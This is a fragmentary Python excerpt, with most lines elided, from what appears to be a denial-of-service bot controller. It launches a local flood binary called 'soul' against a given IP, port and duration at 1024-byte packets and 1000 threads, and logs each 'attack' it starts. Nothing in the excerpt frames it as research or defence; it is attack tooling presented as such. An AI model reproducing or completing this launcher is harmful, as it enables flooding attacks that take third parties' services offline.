        ...
        if key not in active_tasks:
            ...
            try:
                ...
                if os.path.exists('./soul'):
                    ...
                    # packet_size = 1024, threads = 1000
                    cmd = ['./soul', ip, port, time_val, '1024', '1000']
                elif os.path.exists('soul.exe'):
                    cmd = ['soul.exe', ip, port, time_val, '1024', '1000']
                else:
                ...
                print(f"[+] Launched attack with packet_size=1024, threads=1000 (PID: {process.pid})")
...
def main_loop():
    ...
    print(f"[*] Will use packet_size=1024 and threads=1000 for all attacks")
